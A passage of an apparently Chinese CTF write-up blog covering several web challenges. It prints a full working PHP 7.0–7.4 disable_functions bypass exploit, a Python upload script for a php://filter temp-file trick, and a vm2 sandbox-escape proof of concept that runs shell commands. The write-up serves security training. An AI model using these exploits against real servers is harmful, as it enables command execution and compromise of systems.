class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.4 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span class="doctag">Bug:</span> https://bugs.php.net/bug.php?id=76047</span></span><br><span class="line"><span class="comment"># debug_backtrace() returns a reference to a variable</span></span><br><span class="line"><span class="comment"># that has been destroyed, causing a UAF vulnerability.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.4 versions</span></span><br><span class="line"><span class="comment"># released as of 30/01/2020.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line">pwn(<span class="string">&quot;/readflag&quot;</span>); <span class="comment">// command</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;getTrace(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                <span class="variable">$backtrace</span> = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span><span class="number">-1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= ord(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= chr(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = chr(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = strlen(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = leak(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = leak(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = leak(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = leak(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = leak(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = leak(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = leak(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = leak(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = leak(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = leak(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        <span class="variable">$arg</span> = str_shuffle(str_repeat(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> Vuln();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = str_shuffle(str_repeat(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line"></span><br><span class="line">    trigger_uaf(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> Helper;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$abc</span>) == <span class="number">79</span> || strlen(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = leak(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = get_binary_base(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = parse_elf(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = get_basic_funcs(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = get_system(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, leak(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后直接读取。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210727131148708.png"></p><h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><h3 id="hash长度拓展攻击"><a href="#hash长度拓展攻击" class="headerlink" title="hash长度拓展攻击"></a>hash长度拓展攻击</h3><p>查看页面源代码发现</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username/password error<span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--md5($secret.$name)===$pass --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>由于<code>$name和$pass</code>可控，而<code>$secret</code>不可控，则可以用md5长度拓展攻击绕过，<a href="https://blog.csdn.net/qq_24966613/article/details/78638868?ops_request_misc=&request_id=&biz_id=102&utm_term=md5%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-7-.first_rank_v2_pc_rank_v29&spm=1018.2226.3001.4187">具体原理看这</a>。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210727153912921.png"></p><p>发现存在<code>flflflflag.php</code>文件，直接网页打开会404，burpsuite打开。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210727154017552.png"></p><h3 id="string-strip-tags伪协议上传文件"><a href="#string-strip-tags伪协议上传文件" class="headerlink" title="string.strip_tags伪协议上传文件"></a>string.strip_tags伪协议上传文件</h3><p>能<code>include</code>那就先扔个php伪协议，看看<code>flflflflag.php</code>源码。</p><blockquote><p>?file=php://filter/read=convert.base64-encode/resource=flflflflag.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=<span class="string">&quot;javascript&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">           window.location.href=<span class="string">&quot;404.html&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/data|input|zip/is&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>能写一句话和命令执行的伪协议都ban掉了，但是问题不大仍然可以用<code>string.strip_tags</code>进行文件上传，<a href="https://www.cnblogs.com/tr1ple/p/11301743.html">原理看这</a>。</p><blockquote><p>使用php://filter/string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell</p></blockquote><p>写个脚本上传，传二进制的，可以直接传🐎，但是我这里写了个phpinfo()试试。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;url/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">payload = <span class="string">b&quot;&lt;?php phpinfo();?&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">data = [(<span class="string">&#x27;file&#x27;</span>, payload)]</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url, files=data)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>然后这道题还给了个<code>dir.php</code>，所以可以不需要进行文件名爆破。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210727160128599.png"></p><p>直接查看文件，flag在phpinfo里就能看到。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210727160306665.png"></p><blockquote><p>flag{3ec89c04-0dc3-41d4-9d05-3ca228e8f8cd}</p></blockquote><h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><h3 id="VM沙盒溢出"><a href="#VM沙盒溢出" class="headerlink" title="VM沙盒溢出"></a>VM沙盒溢出</h3><p>题目提示不是PHP，那可能就是JS了，然后给出了<code>run.php</code>的源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;code&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;code&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">eval</span>(code);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里的这个<code>eval</code>其实已经暗示了，它并没有直接执行的<code>$code</code>变量，而是选择<code>eval(code)</code>，而且eval()函数不仅php有，nodejs也有。</p><p>输入<code>Error().stack</code>尝试查看文件位置。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210728092700200.png"></p><p>成功执行，那就铁定是nodejs了，还提示了<code>VM</code>，猜测是nodejs的VM沙盒逃逸问题，<a href="https://www.anquanke.com/post/id/207291">原理可以看这</a>。</p><p><a href="https://github.com/patriksimek/vm2/issues/225">github上可以找到poc</a>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">&#x27;(&#x27;</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e.get_process(<span class="function">()=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;+<span class="string">&#x27;)()&#x27;</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于ban了一些东西，可以用`${`a`}`拼接字符串绕过。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210728101124959.png"></p><p>最终payload:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 